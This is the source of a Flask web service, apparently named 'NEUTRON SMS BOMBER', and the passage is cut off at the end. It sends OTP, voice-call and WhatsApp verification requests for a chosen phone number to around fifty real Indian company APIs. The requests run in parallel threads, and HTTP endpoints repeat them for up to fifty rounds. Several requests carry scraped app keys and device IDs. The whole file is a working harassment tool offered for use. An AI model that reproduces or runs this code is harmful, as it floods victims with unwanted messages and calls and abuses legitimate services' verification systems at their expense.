import os
from flask import Flask, request, jsonify
import requests
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ==================== CONFIG ====================
TIMEOUT = 5
MAX_THREADS = 100
REQUEST_DELAY = 0.1

# ==================== API BOMBER CLASS ====================
class APIBomber:
    def __init__(self, phone):
        self.phone = phone
        self.masked_phone = "*******" + phone[-4:]
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; RMX3782 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.159 Mobile Safari/537.36'
        })
    
    # ============ NEW CONFIRMED WORKING APIS ============
    
    def tata_capital(self):
        url = "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice"
        payload = f'{{"phone":"{self.phone}","isOtpViaCallAtLogin":"true"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Tata Capital", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Tata Capital", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def mamaearth(self):
        url = "https://auth.mamaearth.in/v1/auth/initiate-signup"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "MamaEarth", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "MamaEarth", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def redcliffe(self):
        url = "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false"
        payload = f'{{"phone_number":"{self.phone}","short":true}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Redcliffe Labs", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Redcliffe Labs", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def dehaat(self):
        url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
        payload = f'{{"mobile":"{self.phone}","client_id":"kisan-app"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "DeHaat", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "DeHaat", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def housing(self):
        url = "https://login.housing.com/api/v2/send-otp"
        payload = f'{{"phone":"{self.phone}","country_url_name":"in"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Housing.com", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Housing.com", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def orange_health(self):
        url = "https://accounts.orangehealth.in/api/v1/user/otp/generate/"
        payload = f'{{"mobile_number":"{self.phone}","customer_auto_fetch_message":true}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Orange Health", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Orange Health", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def brevistay(self):
        url = "https://www.brevistay.com/cst/app-api/login"
        payload = f'{{"is_otp":1,"is_password":0,"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Brevistay", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Brevistay", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def xylem(self):
        url = "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348"
        payload = f'{{"mobile":"{self.phone}","countryCode":"+91","firstName":"User"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Xylem", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Xylem", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def physics_wallah(self):
        url = "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=1"
        payload = f'{{"mobile":"{self.phone}","countryCode":"+91"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Physics Wallah", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Physics Wallah", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def tradeindia(self):
        url = "https://apis.tradeindia.com/app_login_api/login_app"
        payload = f'{{"mobile":"+91{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "TradeIndia", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "TradeIndia", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def hourlyrooms(self):
        url = "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Hourlyrooms", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Hourlyrooms", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def hungama(self):
        url = "https://communication.api.hungama.com/v1/communication/otp"
        payload = f'{{"mobileNo":"{self.phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Hungama", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Hungama", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def freedo(self):
        url = "https://api.freedo.rentals/customer/sendOtpForSignUp"
        payload = f'{{"email_id":"user{self.phone}@temp.com","first_name":"User","mobile_number":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Freedo Rentals", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Freedo Rentals", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def aakash(self):
        url = "https://antheapi.aakash.ac.in/api/generate-lead-otp"
        payload = f'{{"mobile_number":"{self.phone}","activity_type":"aakash-myadmission"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Aakash", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Aakash", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def apnatime(self):
        url = "https://api.apnatime.in/v1/auth/otp"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "ApnaTime", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "ApnaTime", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def licious(self):
        url = "https://www.licious.in/api/login/signup"
        payload = f'{{"phone":"{self.phone}","captcha_token":null}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Licious", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Licious", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def snapdeal(self):
        url = "https://www.snapdeal.com/api/v1/user/otp/send"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Snapdeal", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Snapdeal", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def mybharat(self):
        url = "https://mybharat.gov.in/api/v1/auth/otp"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "MY Bharat", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "MY Bharat", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def swiggy_call(self):
        url = "https://profile.swiggy.com/api/v3/app/request_call_verification"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Swiggy Call", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Swiggy Call", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def goibibo_voice(self):
        url = "https://www.goibibo.com/user/voice-otp/generate/"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Goibibo Voice", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Goibibo Voice", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def airtel_thanks(self):
        url = "https://www.airtel.in/api/v1/voice-otp"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Airtel Thanks", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Airtel Thanks", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def kpn_whatsapp(self):
        url = "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6"
        payload = f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{self.phone}"}}}}'
        headers = {'x-app-id': '66ef3594-1e51-4e15-87c5-05fc8208a20f', 'content-type': 'application/json; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "KPN WhatsApp", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "KPN WhatsApp", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def jockey_whatsapp(self):
        url = f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{self.phone}?whatsapp=true"
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.get(url, headers=headers, timeout=TIMEOUT)
            return {"name": "Jockey WhatsApp", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Jockey WhatsApp", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def nobroker_sms(self):
        url = "https://www.nobroker.in/api/v3/account/otp/send"
        payload = f"phone={self.phone}&countryCode=IN"
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "NoBroker SMS", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "NoBroker SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def lenskart_sms(self):
        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"
        payload = f'{{"phoneCode":"+91","telephone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Lenskart SMS", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Lenskart SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def byjus_sms(self):
        url = "https://api.byjus.com/v2/otp/send"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Byju's SMS", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Byju's SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def oyo_sms(self):
        url = "https://www.oyorooms.com/api/pwa/generateotp?locale=en"
        payload = f'{{"phone":"{self.phone}","country_code":"+91","nod":4}}'
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'Mozilla/5.0'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "OYO SMS", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "OYO SMS", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def breeze_session(self):
        url = "https://api.breeze.in/session/start"
        payload = f'{{"phoneNumber":"{self.phone}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'
        headers = {'Content-Type': 'application/json', 'x-device-id': 'A1pKVEDhlv66KLtoYsml3', 'x-session-id': 'MUUdODRfiL8xmwzhEpjN8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Breeze Session", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Breeze Session", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def kpn_fresh_2(self):
        url = "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3"
        payload = f'{{"phone_number":{{"country_code":"+91","number":"{self.phone}"}}}}'
        headers = {'x-app-id': '32178bdd-a25d-477e-b8d5-60df92bc2587', 'Content-Type': 'application/json; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "KPN Fresh 2", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "KPN Fresh 2", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def aditya_birla(self):
        url = "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP"
        payload = f"MobileNumber={self.phone}&functionality=signup"
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Aditya Birla", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Aditya Birla", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def muthoot_finance(self):
        url = "https://www.muthootfinance.com/smsapi.php"
        payload = f"mobile={self.phone}&pin=XjtYYEdhP0haXjo3"
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Muthoot Finance", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Muthoot Finance", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def gopaysense(self):
        url = "https://api.gopaysense.com/users/otp"
        payload = f'{{"phone":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "GoPaySense", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "GoPaySense", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def dream11(self):
        url = "https://www.dream11.com/auth/passwordless/init"
        payload = f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{self.phone}","templateName":"default"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Dream11", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Dream11", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def spinny(self):
        url = "https://api.spinny.com/api/c/user/otp-request/v3/"
        payload = f'{{"contact_number":"{self.phone}","whatsapp":false,"code_len":4,"expected_action":"login"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Spinny", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Spinny", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def rapido(self):
        url = "https://customer.rapido.bike/api/otp"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Rapido", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Rapido", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def betterhalf(self):
        url = "https://api.betterhalf.ai/v2/auth/otp/send/"
        payload = f'{{"mobile":"{self.phone}","isd_code":"91"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "BetterHalf", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "BetterHalf", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def charzer(self):
        url = "https://api.charzer.com/auth-service/send-otp"
        payload = f'{{"mobile":"{self.phone}","appSource":"CHARZER_APP"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Charzer", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Charzer", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def mpokket(self):
        url = "https://web-api.mpokket.in/registration/sendOtp"
        payload = f'{{"mobile":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Mpokket", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Mpokket", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def ixigo(self):
        url = "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp"
        payload = f"sixDigitOTP=true&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={self.phone}"
        headers = {'apikey': 'ixiweb\u00212$', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "ixigo", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "ixigo", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def zerodha(self):
        url = "https://zerodha.com/account/registration.php"
        payload = f'{{"mobile":"{self.phone}","source":"zerodha","partner_id":""}}'
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Zerodha", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Zerodha", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def testbook(self):
        url = "https://api.testbook.com/api/v2/mobile/signup"
        payload = f'{{"mobile":"{self.phone}","signupDetails":{{"page":"HomePage"}}}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Testbook", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Testbook", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def medibuddy(self):
        url = "https://loginprod.medibuddy.in/unified-login/user/register"
        payload = f'{{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"{self.phone}","flow":"Retail-Login-Home-Flow"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "MediBuddy", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "MediBuddy", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def udaan(self):
        url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2"
        payload = f"mobile={self.phone}"
        headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Udaan", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Udaan", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def vidyakul(self):
        url = "https://vidyakul.com/signup-otp/send"
        payload = f"phone={self.phone}"
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Vidyakul", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Vidyakul", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def beyoung(self):
        url = "https://www.beyoung.in/api/sendOtp.json"
        payload = f'{{"username":"{self.phone}","username_type":"mobile","service_type":0}}'
        headers = {'Content-Type': 'application/json;charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Beyoung", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Beyoung", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def wrogn(self):
        url = "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp"
        payload = f'{{"username":"+91{self.phone}","type":"mobile","domain":"wrogn.com"}}'
        headers = {'action': 'sendOTP', 'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Wrogn", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Wrogn", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def medkart(self):
        url = "https://app.medkart.in/api/v1/auth/requestOTP"
        payload = f'{{"mobile_no":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Medkart", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Medkart", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def lovelocal(self):
        url = "https://homedeliverybackend.mpaani.com/auth/send-otp"
        payload = f'{{"phone_number":"{self.phone}","role":"CUSTOMER"}}'
        headers = {'client-code': 'vulpix', 'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Lovelocal", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Lovelocal", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def tyreplex(self):
        url = "https://www.tyreplex.com/includes/ajax/gfend.php"
        payload = f"perform_action=sendOTP&mobile_no={self.phone}&action_type=order_login"
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Tyreplex", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Tyreplex", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def citymall(self):
        url = "https://citymall.live/api/cl-user/auth/get-otp"
        payload = f'{{"phone_number":"{self.phone}"}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Citymall", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Citymall", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def pagarbook(self):
        url = "https://api.pagarbook.com/api/v5/auth/otp/request"
        payload = f'{{"phone":"{self.phone}","language":1}}'
        headers = {'Content-Type': 'application/json'}
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Pagarbook", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Pagarbook", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def attack_round(self):
        apis = [
            (self.tata_capital, "Tata Capital"),
            (self.mamaearth, "MamaEarth"),
            (self.redcliffe, "Redcliffe Labs"),
            (self.dehaat, "DeHaat"),
            (self.housing, "Housing.com"),
            (self.orange_health, "Orange Health"),
            (self.brevistay, "Brevistay"),
            (self.xylem, "Xylem"),
            (self.physics_wallah, "Physics Wallah"),
            (self.tradeindia, "TradeIndia"),
            (self.hourlyrooms, "Hourlyrooms"),
            (self.hungama, "Hungama"),
            (self.freedo, "Freedo Rentals"),
            (self.aakash, "Aakash"),
            (self.apnatime, "ApnaTime"),
            (self.licious, "Licious"),
            (self.snapdeal, "Snapdeal"),
            (self.mybharat, "MY Bharat"),
            (self.swiggy_call, "Swiggy Call"),
            (self.goibibo_voice, "Goibibo Voice"),
            (self.airtel_thanks, "Airtel Thanks"),
            (self.kpn_whatsapp, "KPN WhatsApp"),
            (self.jockey_whatsapp, "Jockey WhatsApp"),
            (self.nobroker_sms, "NoBroker SMS"),
            (self.lenskart_sms, "Lenskart SMS"),
            (self.byjus_sms, "Byju's SMS"),
            (self.oyo_sms, "OYO SMS"),
            (self.breeze_session, "Breeze Session"),
            (self.kpn_fresh_2, "KPN Fresh 2"),
            (self.aditya_birla, "Aditya Birla"),
            (self.muthoot_finance, "Muthoot Finance"),
            (self.gopaysense, "GoPaySense"),
            (self.dream11, "Dream11"),
            (self.spinny, "Spinny"),
            (self.rapido, "Rapido"),
            (self.betterhalf, "BetterHalf"),
            (self.charzer, "Charzer"),
            (self.mpokket, "Mpokket"),
            (self.ixigo, "ixigo"),
            (self.zerodha, "Zerodha"),
            (self.testbook, "Testbook"),
            (self.medibuddy, "MediBuddy"),
            (self.udaan, "Udaan"),
            (self.vidyakul, "Vidyakul"),
            (self.beyoung, "Beyoung"),
            (self.wrogn, "Wrogn"),
            (self.medkart, "Medkart"),
            (self.lovelocal, "Lovelocal"),
            (self.tyreplex, "Tyreplex"),
            (self.citymall, "Citymall"),
            (self.pagarbook, "Pagarbook")
        ]
        
        results = []
        with ThreadPoolExecutor(max_workers=min(MAX_THREADS, len(apis))) as executor:
            futures = {executor.submit(func): name for func, name in apis}
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
        
        return results

# ==================== ROUTES ====================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "service": "NEUTRON SMS BOMBER API",
        "version": "4.0 - RENDER EDITION",
        "developer": "ROHIT HACKER",
        "endpoints": {
            "/bomb/<phone>": "GET - Single round attack",
            "/bomb/<phone>/<rounds>": "GET - Multiple rounds attack",
            "/status": "GET - API status",
            "/apis": "GET - List all APIs"
        }
    })

@app.route('/bomb/<phone>', methods=['GET'])
def bomb_direct(phone):
    if len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
    
    masked = "*******" + phone[-4:]
    bomber = APIBomber(phone)
    results = bomber.attack_round()
    
    success_count = sum(1 for r in results if r.get('success', False))
    fail_count = len(results) - success_count
    
    return jsonify({
        "status": "completed",
        "target": masked,
        "round": 1,
        "total_apis": len(results),
        "success_count": success_count,
        "failed_count": fail_count,
        "results": results
    })

@app.route('/bomb/<phone>/<int:rounds>', methods=['GET'])
def bomb_direct_rounds(phone, rounds):
    if len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
    
    if rounds > 50:
        rounds = 50
    if rounds < 1:
        rounds = 1
    
    masked = "*******" + phone[-4:]
    bomber = APIBomber(phone)
    all_results = []
    total_success = 0
    total_failed = 0
    
    for round_num in range(1, rounds + 1):
        results = bomber.attack_round()
        success_count = sum(1 for r in results if r.get('success', False))
        fail_count = len(results) - success_count
        total_success += success_count
        total_failed += fail_count
        
        all_results.append({
            "round": round_num,
            "success": success_count,
            "failed": fail_count,
            "details": results
        })
        
        if round_num < rounds:
            time.sleep(REQUEST_DELAY)
    
    return jsonify({
        "status": "completed",
        "target": masked,
        "total_rounds": rounds,
        "total_apis": 51,
        "total_success": total_success,
        "total_failed": total_failed,
        "rounds": all_results
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "status": "online",
        "service": "NEUTRON SMS BOMBER - RENDER EDITION",
        "threads": MAX_THREADS,
        "timeout": TIMEOUT,
        "apis": 51,
        "developer": "ROHIT HACKER",
        "powered_by": "NEUTRON ENGINE"
    })

@app.route('/apis', methods=['GET'])
def list_apis():
    apis = [
        "Tata Capital", "MamaEarth", "Redcliffe Labs", "DeHaat", 
        "Housing.com", "Orange Health", "Brevistay", "Xylem", 
        "Physics Wallah", "TradeIndia", "Hourlyrooms", "Hungama",
        "Freedo Rentals", "Aakash", "ApnaTime", "Licious",
        "Snapdeal", "MY Bharat", "Swiggy Call", "Goibibo Voice",
